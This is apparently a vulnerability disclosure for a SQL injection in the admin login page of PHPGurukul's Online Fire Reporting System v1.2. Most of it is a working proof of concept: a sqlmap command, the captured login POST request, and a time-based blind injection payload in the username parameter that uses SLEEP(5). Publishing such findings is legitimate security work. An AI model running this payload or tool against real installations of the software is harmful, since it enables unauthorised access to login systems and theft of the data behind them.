# SQLi vulnerability in Online Fire Reporting System v1.2 of file /admin/index.php

**vender**:

- [PHPGurukul](https://vuldb.com/?vendor.phpgurukul)
- Online Fire Reporting System

**SoftLink**:

- [Online Fire Reporting System Project in PHP- PHPGurukul](https://phpgurukul.com/online-fire-reporting-system-using-php-and-mysql/)

**Vulnerable File**

- /admin/index.php

**Version**

- V1.2

### POC

```bash
sqlmap -r request.txt --level 5 --batch
```



```http
POST /admin/ HTTP/1.1
Host: www.firereport.top
Cookie: PHPSESSID=vhqmp6o0p6p8lf7sscpqhrp6tf
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Origin: http://www.firereport.top
Referer: http://www.firereport.top/admin/
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept-Encoding: gzip, deflate
Content-Length: 33

username=1&inputpwd=1&login=login
```



![image-20250531184016046](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505311840133.png)

```
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=1' AND (SELECT 7844 FROM (SELECT(SLEEP(5)))ZsBh)-- Lnbc&inputpwd=1&login=login
---
```

